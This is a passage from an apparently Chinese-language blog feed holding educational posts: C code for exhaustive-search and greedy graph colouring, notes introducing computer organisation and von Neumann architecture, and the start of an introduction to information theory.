class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> c<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> c <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>c<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment">//试探c个灯，检查是否能得到答案</span>        <span class="token function">hs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"End!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><h2 id="2-贪心算法"><a href="#2-贪心算法" class="headerlink" title="2. 贪心算法"></a>2. 贪心算法</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> e<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> cnt_color <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token comment">//一层循环，找到未涂色的点</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            v<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> cnt_color<span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"第%d种颜色节点：%d "</span><span class="token punctuation">,</span> cnt_color<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token comment">//二层循环，找到与i不冲突且未着色的顶点</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> h <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>h<span class="token punctuation">)</span> <span class="token comment">//三层循环，确定j与其他同色的点不冲突</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> v<span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">==</span> cnt_color<span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        v<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> cnt_color<span class="token punctuation">;</span>                        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            cnt_color<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"总共%d种颜色\n"</span><span class="token punctuation">,</span> cnt_color <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 穷举法 </tag>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理绪论</title>
      <link href="2020/02/28/ji-suan-ji-zu-cheng-yuan-li-xu-lun/"/>
      <url>2020/02/28/ji-suan-ji-zu-cheng-yuan-li-xu-lun/</url>
      
        <content type="html"><![CDATA[<h2 id="1-一些概念"><a href="#1-一些概念" class="headerlink" title="1. 一些概念"></a>1. 一些概念</h2><ul><li><strong>主机</strong>：CPU+MM（主存或内存）</li><li><strong>CPU</strong>：中央处理器。包括运算器和控制器。</li><li><strong>主存</strong>：存放正在运行的程序和数据，可随机存取</li><li><strong>存储单元</strong>：可以存放机器字并具有特定存储地址的存储单位</li><li><strong>存储元件</strong>：存储一位二进制信息的物理元件</li><li><strong>存储字</strong>：一个存储单元所存二进制代码的逻辑单位</li><li><strong>存储字长</strong>：一个存储单元所存二进制代码的位数</li><li><strong>存储容量</strong>：存储器可存二进制代码的容量</li><li><strong>机器字长</strong>：CPU一次能处理的数据位数（取决于寄存器位数）</li><li><strong>指令字长</strong>：一条指令的二进制代码位数</li></ul><span id="more"></span><h2 id="2-英文缩写的中文含义"><a href="#2-英文缩写的中文含义" class="headerlink" title="2. 英文缩写的中文含义"></a>2. 英文缩写的中文含义</h2><ul><li><strong>CPU</strong>(Central Processing Unit)：中央处理器。运算器+控制器。</li><li><strong>PC</strong>(Program Counter)：程序计数器。位于控制器，存放当前欲执行指令地址，并自动计数形成下一条指令的地址</li><li><strong>IR</strong>(Instruction Register)：指令寄存器。存放当前正执行执行指令的计数器</li><li><strong>CU</strong>(Control Unit)：控制单元。控制器中产生微操作命令序列的部件</li><li><strong>ALU</strong>(Arithmet Logic Unit)：算术逻辑运算单元</li><li><strong>ACC</strong>(Accumator)：累加器。存放操作数和运算结果</li><li><strong>MQ</strong>(Multiplier-Quotient Register)：乘商寄存器。乘法时存放乘数，除法时存放商</li><li><strong>MAR</strong>(Memory Address Register)：存储器地址寄存器。内存中存放欲访问存储单元地址的寄存器</li><li><strong>MDR</strong>(Memory Data Register)：存储器数据寄存器</li><li><strong>I/O</strong>(Input/Output equipment)：输入输出设备</li><li><strong>MIPS</strong>(Million Instruction Pre Second)：每秒执行百万条指令</li><li><strong>CPI</strong>(Cycle Per Instruction)：执行一条指令所需要的指令周期数</li><li><strong>FLOPS</strong>(Floating Point Operation Per Second)：每秒浮点运算次数</li></ul><h2 id="3-冯·诺依曼计算机"><a href="#3-冯·诺依曼计算机" class="headerlink" title="3. 冯·诺依曼计算机"></a>3. 冯·诺依曼计算机</h2><h3 id="3-1-特点（重点）"><a href="#3-1-特点（重点）" class="headerlink" title="3.1 特点（重点）"></a>3.1 特点（重点）</h3><ul><li>由五大部件组成，包括运算器、存储器、控制器和输入输出设备</li><li>指令和数据以同等地位存于存储器，可按地址寻访</li><li>指令和数据均用二进制码表示（如何区分？）</li><li>指令由操作码和地址码组成，操作码用来表示操作的性质，地址码用来表示操作数所在存储器中的位置</li><li>存储程序：指令在存储器内按顺序存放，通常顺序执行，可跳转（存储程序与PC的关系？）</li><li>以运算器为中心，I/O设备与存储器的数据传送要通过运算器</li></ul><blockquote><p> <strong>如何理解“存储程序”与PC的关系？</strong></p><p>存储程序：指令在存储器内顺序存放、顺序执行，但可以根据运算结果或设定进行跳转。存储器能自动运行依赖于PC，PC存储欲执行指令的地址，并且在指令执行完后自动+1，直至停机。</p></blockquote><blockquote><p> <strong>计算机如何区分同样以0,1代码的形式存储在存储器中的指令和数据？</strong></p><p>从时间角度：在取指周期取出的为指令，在执行周期取出的是数据。</p><p>从空间角度：访存时地址是由PC给出的，那么取出的是指令；若地址是由指令的地址码给出的，那么取出的是操作数。</p></blockquote><h3 id="3-2-硬件框图"><a href="#3-2-硬件框图" class="headerlink" title="3.2 硬件框图"></a>3.2 硬件框图</h3><h2 id="4-一条指令的执行过程"><a href="#4-一条指令的执行过程" class="headerlink" title="4. 一条指令的执行过程"></a>4. 一条指令的执行过程</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZTU4YjRjZDYxMjdjYzA3MTMxZWI4ZGUuanBn?x-oss-process=image/format,png"></p><p><strong>主机完成一条指令一般需要三个步骤：</strong></p><ol><li>取指令阶段</li><li>分析指令阶段</li><li>执行指令阶段</li></ol><p><strong>下面是取数指令的执行过程：</strong></p><ol><li>取指：PC-&gt;MAR-&gt;M-&gt;MDR-&gt;IR</li><li>分析：OP(IR)-&gt;CU</li><li>执行指令：AD(IR)-&gt;MAR-&gt;M-&gt;MDR-&gt;ACC</li></ol><p><strong>存数指令的执行过程：</strong></p><ol><li>取指令：PC-&gt;MAR-&gt;M-&gt;MDR-&gt;IR</li><li>分析指令：OP(IR)-&gt;CU</li><li>执行指令：AD(IR)-&gt;MAR-&gt;M, ACC-&gt;MDR-&gt;M</li></ol><p><strong>加法指令的执行过程：</strong></p><ol><li>取指令：PC-&gt;MAR-&gt;M-&gt;MDR-&gt;IR</li><li>分析指令：OP(IR)-&gt;CU</li><li>执行指令：AD(IR)-&gt;MAR-&gt;M-&gt;MAR-&gt;X, ACC-&gt;ALU, X-&gt;ALU, ALU-&gt;ACC</li></ol><blockquote><p>存储容量为$256M\times 32$位，256M代表了存储单元的个数，32位代表了存储字长。$256M=2^{28}$，所以地址线有28根。地址线的根数决定了存储单元有多少个。PC和MAR也就是28位。</p></blockquote><h2 id="5-计算机系统层次结构"><a href="#5-计算机系统层次结构" class="headerlink" title="5. 计算机系统层次结构"></a>5. 计算机系统层次结构</h2><ul><li>硬件和软件的分界线是<strong>指令</strong>。</li></ul><h2 id="6-计算机组成与计算机体系结构"><a href="#6-计算机组成与计算机体系结构" class="headerlink" title="6. 计算机组成与计算机体系结构"></a>6. 计算机组成与计算机体系结构</h2><ul><li>计算机体系结构：是程序员所见到的计算机系统的属性，即概念性的结构与功能特性（指令系统、数据类型、寻址技术、I/O机理等）</li><li>计算机组成：如何实现计算机体系结构所体现的属性</li><li>一个计算机体系结构对应多个计算机组成，一个计算机组成对应多个计算机实现</li><li>硬件和软件在功能上等价</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息论简介</title>
      <link href="2020/02/24/xin-xi-lun-jian-jie/"/>
      <url>2020/02/24/xin-xi-lun-jian-jie/</url>
      
        <content type="html"><![CDATA[<p>本章重点为信息的定义（不确定性）、信息学研究的对象（五个）和信息论研究的目的（三点）。</p><p>此外，掌握与信息测度相关的几个概念（样本空间、概率空间、先验概率、后验概率、自信息和互信息），明确本学科研究的重点（狭义信息论、语法信息）</p><h2 id="1-信息论简史"><a href="#1-信息论简史" class="headerlink" title="1. 信息论简史"></a>1. 信息论简史</h2><ul><li>诞生：1948年，香农发表《通信的数学理论》</li><li>通信技术+概率测度+数理统计+随机过程</li><li>香农理论的核心：在通信系统中采用适当的编码后能够实现<strong>高效率</strong>和<strong>高可靠性</strong>的信息传输，并得出了<strong>信源编码</strong>（效率）定理和<strong>信道编码</strong>（可靠性）定理。</li></ul><h2 id="2-信息的概念"><a href="#2-信息的概念" class="headerlink" title="2. 信息的概念"></a>2. 信息的概念</h2><h3 id="2-1-几个术语的对比"><a href="#2-1-几个术语的对比" class="headerlink" title="2.1 几个术语的对比"></a>2.1 几个术语的对比</h3><h4 id="2-1-1-知识"><a href="#2-1-1-知识" class="headerlink" title="2.1.1 知识"></a>2.1.1 知识</h4><p>有价值的信息。（是信息的子集）</p><h4 id="2-1-2-情报"><a href="#2-1-2-情报" class="headerlink" title="2.1.2 情报"></a>2.1.2 情报</h4><p>使人们对于某个特定对象所感而产生的知识。（是知识的子集）</p><h4 id="2-1-3-消息"><a href="#2-1-3-消息" class="headerlink" title="2.1.3 消息"></a>2.1.3 消息</h4><h5 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h5><p>把客观物质运动和主观思维活动的状态用文字、符号、图像、数据、语言、音符、图像等能够被人们感觉器官感知的形式表达出来。</p><h5 id="2-消息具备的两个条件"><a href="#2-消息具备的两个条件" class="headerlink" title="2. 消息具备的两个条件"></a>2. 消息具备的两个条件</h5><ul><li>能够被通信双方感知</li><li>可以传递</li></ul><h5 id="3-和信息的关系"><a href="#3-和信息的关系" class="headerlink" title="3. 和信息的关系"></a>3. 和信息的关系</h5><p>消息的内容是信息，因此可以说<strong>消息是信息的载体</strong>。</p><p>但是消息可以被感知，而信息是一种抽象的东西，不可以被具体感知。</p><h4 id="2-1-4-信号"><a href="#2-1-4-信号" class="headerlink" title="2.1.4 信号"></a>2.1.4 信号</h4><h5 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="1. 定义"></a>1. 定义</h5><p>把消息变换成适合信道传输的<strong>物理量</strong>。</p><h5 id="2-和消息、信息的关系"><a href="#2-和消息、信息的关系" class="headerlink" title="2. 和消息、信息的关系"></a>2. 和消息、信息的关系</h5><p>信号是消息传达过程中用来表示消息的一个物理量，是承载信息的实体。<strong>信号是外壳，消息是内核</strong>。消息被人所感之后，在大脑中形成了信息。</p><h3 id="2-2-通信系统模型"><a href="#2-2-通信系统模型" class="headerlink" title="2.2 通信系统模型"></a>2.2 通信系统模型</h3><h3 id="2-3-香农信息的概念"><a href="#2-3-香农信息的概念" class="headerlink" title="2.3 香农信息的概念"></a>2.3 香农信息的概念</h3><h4 id="2-3-1-传输过程中的特点"><a href="#2-3-1-传输过程中的特点" class="headerlink" title="2.3.1 传输过程中的特点"></a>2.3.1 传输过程中的特点</h4><ul><li>收信者在接受到消息前不知道消息的具体内容</li><li>收信者在接收到消息前无法判断是描述哪种状态</li><li>收信者在接收到消息后，由于干扰的存在，无法判断正确性与可靠性</li></ul><p>由于这些特点，香农总结出了信息的概念。</p><h4 id="2-3-2-香农信息的概念"><a href="#2-3-2-香农信息的概念" class="headerlink" title="2.3.2 香农信息的概念"></a>2.3.2 香农信息的概念</h4><p><strong>信息是事物运动状态或存在方式的<u>不确定性的描述</u>。</strong></p><p>通信的结果就是<strong>消除或部分消除不确定性</strong>，从而获得信息。</p><p>通信系统形式上传输的是消息，实际上传输的是信息。</p><h4 id="2-3-3-优点"><a href="#2-3-3-优点" class="headerlink" title="2.3.3 优点"></a>2.3.3 优点</h4><ul><li><strong>有明确的数学模型和定量计算</strong></li><li>与日常用语中的信息的含义一致</li><li>排除了对信息一词某些主观上的含义</li></ul><h4 id="2-3-4-局限性"><a href="#2-3-4-局限性" class="headerlink" title="2.3.4 局限性"></a>2.3.4 局限性</h4><ul><li>假定事物状态可用以经典集合论为基础的概率模型来描述</li><li>没有考虑到收信者的主观特性和主观意义</li></ul><h4 id="2-3-5-香农信息的度量"><a href="#2-3-5-香农信息的度量" class="headerlink" title="2.3.5 香农信息的度量"></a>2.3.5 香农信息的度量</h4><p>不确定性的大小可以用<strong>概率</strong>来度量。</p><h3 id="2-4-与信息测度相关的几个概念"><a href="#2-4-与信息测度相关的几个概念" class="headerlink" title="2.4 与信息测度相关的几个概念"></a>2.4 与信息测度相关的几个概念</h3><ul><li><p>样本空间</p></li><li><p>概率空间：样本空间及其概率测度$[X,P]$</p>   </li><li><p>先验概率：选择符号$a_i$作为消息的概率——$P(a_i)$</p></li><li><p>后验概率：接收端收到信息$b_j$后，而发送端发的是$a_j$的概率$P(a_j/b_j)$</p></li><li><p>自信息：$a_i$本身携带的信息量：$I(a_i) = \log(1/P(a_i))$</p></li><li><p>互信息：收信者获得的信息量——先验的不确定性减去尚存在的不确定性：$I(a_i;b_j) = I(a_i) - log(1/P(a_i/b_j))$</p></li></ul><h3 id="2-5-理解信息的概念"><a href="#2-5-理解信息的概念" class="headerlink" title="2.5 理解信息的概念"></a>2.5 理解信息的概念</h3><p>信息具有以下特征：</p><ul><li>可识别</li><li>载体可转换</li><li>可存贮</li><li>可传递</li><li>可加工（压缩、打包）</li><li>可共享</li></ul><h3 id="2-3-信息的分类"><a href="#2-3-信息的分类" class="headerlink" title="2.3 信息的分类"></a>2.3 信息的分类</h3><p>按照信息的性质分类：</p><ul><li>语法信息：是“事物运动状态和状态改变方式”本身</li><li>语义信息：具体含义</li><li>语用信息：对观察者的效用</li></ul><p>这门课只研究语法信息。</p><h2 id="3-信息论研究的对象、目的和内容"><a href="#3-信息论研究的对象、目的和内容" class="headerlink" title="3. 信息论研究的对象、目的和内容"></a>3. 信息论研究的对象、目的和内容</h2><h3 id="3-1-通信系统模型"><a href="#3-1-通信系统模型" class="headerlink" title="3.1 通信系统模型"></a>3.1 通信系统模型</h3><h3 id="3-2-信息论研究的对象"><a href="#3-2-信息论研究的对象" class="headerlink" title="3.2 信息论研究的对象"></a>3.2 